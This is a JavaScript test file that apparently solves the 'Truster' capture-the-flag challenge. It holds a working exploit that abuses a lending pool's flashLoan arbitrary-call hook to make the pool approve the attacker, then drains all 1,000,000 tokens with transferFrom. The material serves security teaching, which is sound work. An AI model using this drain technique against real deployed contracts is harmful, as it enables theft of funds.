const { ether } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');

const { expect } = require('chai');

describe('[Challenge] Truster', function () {

    const [deployer, attacker, ...otherAccounts] = accounts;

    const TOKENS_IN_POOL = ether('1000000');

    before(async function () {
        /** SETUP SCENARIO */
        this.token = await DamnValuableToken.new({ from: deployer });
        this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal('0');
    });

    it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
        
        // PoA
        // call flashLoan(1, attacker, this.token.address, data)
        // where data is an encoded call to approve transfers to the attackers address
        // then transfer the token from the pool to the attacker

        // encode the call to approve
        const data = this.token.contract.methods.approve(attacker, TOKENS_IN_POOL).encodeABI()

        // call flashLoan, passing in the token address as the target and the payload
        await this.pool.flashLoan(0, attacker, this.token.address, data);

        // transfer the tokens from the pool to the attacker
        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, {
            from: attacker,
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal('0');
    });
});
